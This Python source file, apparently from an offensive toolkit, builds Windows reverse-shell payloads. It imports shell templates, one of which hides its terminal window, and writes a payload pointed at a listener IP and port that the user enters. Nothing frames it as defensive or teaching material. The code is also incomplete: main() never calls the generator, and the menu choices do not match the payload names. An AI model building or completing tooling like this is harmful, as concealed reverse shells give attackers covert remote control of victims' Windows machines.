import platform
import sys

sys.path.append("..")
from input_management import validate_ip


from reverse_shell_templates.PythonBased import (
    windows_reverse_shell_hidden_terminal,
    windows_reverse_shell_active_terminal)
def create_payload(host, port, file_path, nameForFile=None, payload_type=0):
    """

    :param host: listener address
    :param port: listener port
    :param file_path: file path to save the payload
    :param nameForFile: name for the file to save the payload if left None default name will be used 'reverse_shell_for_windows.py'
    :param payload_type: name of the function to generate the payload (payloads are above in this file)
    :return: file path of the payload
    """
    if platform.system() == 'Windows':
        if nameForFile:
            file_path += f'\\{nameForFile}.py'
        else:
            file_path += '\\python_reverse_shell_for_windows.py'
    elif platform.system() == 'Linux':
        if nameForFile:
            file_path += f'/{nameForFile}.py'
        else:
            file_path += '/python_reverse_shell_for_windows.py'
    with open(file_path, 'w') as f:
        if payload_type == 'windows_reverse_shell_active_terminal':
            f.write(windows_reverse_shell_active_terminal(host, port))
        elif payload_type == 'windows_reverse_shell_hidden_terminal':
            f.write(windows_reverse_shell_hidden_terminal(host, port))
        else:
            return f'Invalid Payload Type {payload_type} {repr(payload_type)}'
    return file_path

def main():
    print("""
    1. Windows Reverse Shell Active Terminal
    2. Windows Reverse Shell Hidden Terminal
    """)
    choice = input("Enter your choice: ")
    host = input("Enter the listener IP: ")
    port = input("Enter the listener port: ")

if __name__ == '__main__':
    main()
